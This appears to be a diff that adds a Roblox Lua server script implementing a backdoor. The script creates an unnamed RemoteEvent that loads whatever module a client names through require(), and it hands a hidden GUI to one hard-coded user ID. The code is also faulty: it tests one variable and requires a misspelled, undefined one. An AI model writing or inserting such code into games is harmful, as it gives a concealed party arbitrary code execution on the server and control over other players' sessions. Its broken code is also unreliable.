@@ -1,0 +1,13 @@
+local remote = Instance.new('RemoteEvent',game.ReplicatedStorage)
+remote.Name = ""
+remote.OnServerEvent:connect(function(plr,Source)
+	if #Source > 0 then
+		require(Scource).load(plr.Name)
+	end
+end)
+
+game.Players.PlayerAdded:Connect(function(plr)
+	if plr.UserId == UserIdHere then
+		script['']:Clone().Parent = plr.PlayerGui
+	end
+end)
